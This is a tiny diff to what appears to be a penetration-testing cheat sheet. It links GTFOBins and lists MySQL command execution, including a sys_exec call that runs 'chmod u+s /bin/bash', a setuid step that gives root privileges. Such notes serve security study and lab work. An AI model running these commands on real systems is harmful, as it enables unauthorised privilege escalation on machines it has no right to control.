@@ -29,6 +29,7 @@ Binaries that can be exploited : https://gtfobins.github.io
 ### MySQL
 
 Execute command : ```mysql -u [user] -p -e "COMMAND HERE"``` 
+
 Execute command as MySQL process owner : ```mysql> SELECT sys_exec('chmod u+s /bin/bash');``` 
 
 ## Windows
